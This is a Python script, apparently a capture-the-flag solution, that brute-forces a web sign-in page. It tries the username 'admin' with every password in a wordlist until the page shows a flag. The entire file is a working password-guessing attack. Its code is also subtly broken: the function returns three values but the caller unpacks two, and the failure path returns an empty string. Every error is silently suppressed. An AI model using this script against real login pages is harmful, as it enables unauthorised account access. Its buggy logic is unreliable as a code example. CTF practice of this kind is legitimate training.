#!/usr/bin/env python3


import requests
import sys
import typing

def brute_force(
    addr: str, login: str, session: requests.Session, f: typing.IO[str]
) -> str:
    n = 0
    for password in f:
        r = session.get(f"http://{addr}/?page=signin&username={login}&password={password.strip()}&Login=Login")
        if "The flag is" in r.text:
            return r.text, password, login
        n += 1
    return ""

def main():
    """Main function"""
    session = requests.session()
    if len(sys.argv) <= 1:
        address = input("Enter your address for brute force: ")
    else:
        address = sys.argv[1]
    with open("password-wordlist.txt", "r") as f:
        password, login = brute_force(address, "admin", session, f)
    print(f"password = {password}, login = {login}")


if __name__ == "__main__":
    try:
        main()
    except Exception as excp:
        print("", file=sys.stderr)
